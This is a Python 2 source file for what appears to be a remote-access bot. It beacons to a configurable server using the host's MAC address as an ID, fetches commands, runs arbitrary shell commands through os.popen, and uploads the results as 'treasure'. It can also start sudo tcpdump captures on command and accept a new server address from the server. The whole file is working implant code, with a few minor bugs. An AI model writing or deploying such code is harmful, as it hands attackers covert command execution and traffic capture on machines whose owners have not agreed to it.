# -*- coding: utf-8 -*-

import uuid
import urllib
import urllib2
import time, threading
import os
import rsa
import json

def crypt(data, is_encrypt=True):
	privatekey = rsa.PrivateKey.load_pkcs1(open('pri.pem', 'r').read())
	publickey = rsa.PublicKey.load_pkcs1(open('pub.pem', 'r').read())
	if is_encrypt:
		if len(data) > 117:
			tmp = ''
			for i in range(len(data) / 117 + 1):
				t = data[i * 117:(i + 1) * 117]
				tmp += rsa.encrypt(t, publickey)
			return tmp
		else:
			return rsa.encrypt(data, publickey)
	else: 
		tmp = ''
		for i in range(len(data) / 128):
			t = data[i * 128:(i + 1) * 128]
			tmp += rsa.decrypt(t, privatekey)
		return tmp


class Client(object):
	status = 0		#0 offline 1; 1 online
	tickDuration = 6
	requestDuration = 10
	captureDuration = 5

	serverIP = "http://127.0.0.1:3000/"

	tickThread = None
	captureThread = None
	captureTimerThread = None
	lastCommand = ""

	def __init__(self):
		super(Client, self).__init__()


	def __getMac(self):
		node = uuid.getnode()
		mac = uuid.UUID(int = node).hex[-12:]
		return mac

	def sendTick(self):
		try:
			print("Sending Tick...")
			url = self.serverIP + "tick"
			values = {"id": self.__getMac()}
			data = urllib.urlencode(values)
			req = urllib2.Request(url, data)
			response = urllib2.urlopen(req)
			# print(response)
			return True
		except Exception, e:
			print(e)
			return False

	def sendResultToServer(self, command_id):
		print("Sending result to server...")
		boundary = '----------%s' % hex(int(time.time() * 1000))
		data = []
		data.append('--%s' % boundary)

		data.append('Content-Disposition: form-data; name="id"\r\n')
		data.append(str(command_id))
		data.append('--%s' % boundary)
		fr=open(str(command_id),'rb')
		data.append('Content-Disposition: form-data; name="treasure"; filename="%s"' % command_id)
		data.append('Content-Type: %s\r\n' % 'octet-stream')
		data.append(fr.read())
		fr.close()
		data.append('--%s--\r\n' % boundary)
    
		http_url = self.serverIP + 'upload'
		http_body='\r\n'.join(data)
		try:
			req = urllib2.Request(http_url, data=http_body)
			req.add_header('Content-Type', 'multipart/form-data; boundary=%s' % boundary)
			resp = urllib2.urlopen(req)
			qrcont=resp.read()
			print('Sent result to server of ID: %s.' % command_id)
			return True
		except Exception,e:
			print 'http error'
			return False

	def getCommandFromServer(self):
		try:
			print("Command\tGetting command from server...")
			url = self.serverIP + "command?id=" + self.__getMac()
			# values = {}
			# data = urllib.urlencode(values)
			req = urllib2.Request(url)
			response = urllib2.urlopen(req)
			command  = response.read()
			commandObject = json.loads(command)
			if commandObject[0] != self.lastCommand:
				self.lastCommand = commandObject[0]
				print("Command\tnew command: " + commandObject[2])
				if commandObject[1] == 'py':
					para = commandObject[2].split(' ')
					if para[0] == 'serverIP':
						self.serverIP = para[1]
					elif para[0] == 'tick':
						self.tickDuration = int(para[1])
					elif para[1] == 'requset':
						self.requestDuration = int(para[1])

				elif commandObject[1] == 'sh':
					para = commandObject[2].split(' ')
					if para[0] != 'tcpdump':
						self.__execShellCommand(commandObject[2] + " > " + str(commandObject[0]))
						self.sendResultToServer(commandObject[0])
					else:
						self.captureThread = threading.Thread(target=capturePacketsThread, args=(self, commandObject,), name='captureThread')
						self.captureTimerThread = threading.Thread(target=killCapturePacketsThread, args=(self, commandObject), name='killCaptureThread')
						self.captureThread.start()
						self.captureTimerThread.start()

			else:
				print("Command\tno commands available.")
			
			return True
		except Exception, e:
			print(e)
			return False

	def capturePackets(self, commandObject):
		# print(timeout)
		# command = "sudo tcpdump -w target.cap '(((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'"
		command = 'sudo %s -w %s' %(commandObject[2], str(commandObject[0]))
		self.captureDuration = int(commandObject[3])
		print("Capture packets...\t" + command)
		self.__execShellCommand(command)
		return

	def killCapturePackets(self, commandObject):
		os.popen("killall -9 tcpdump")
		self.sendResultToServer(commandObject[0])
		# self.captureThread.kill()

	def __execShellCommand(self, command):
		try:
			result = os.popen(command).read()
			return True
		except Exception, e:
			print e
			return False

		
def sendTickThread(client):
	#Tick Thread
	while True:
		client.sendTick()
		time.sleep(client.tickDuration)

def capturePacketsThread(client, commandObject):
	try:
		client.capturePackets(commandObject)
	except Exception, e:
		print(e)
		return False

def killCapturePacketsThread(client, commandObject):
	try:
		time.sleep(client.captureDuration)
		client.killCapturePackets(commandObject)
		print("Capture thread killed.")
		return True
	except Exception, e:
		print e
		return False

client = Client()
client.tickThread = threading.Thread(target=sendTickThread, args=(client,), name='tickThread')
client.tickThread.start()

while True:
	client.getCommandFromServer()
	time.sleep(client.requestDuration)
	




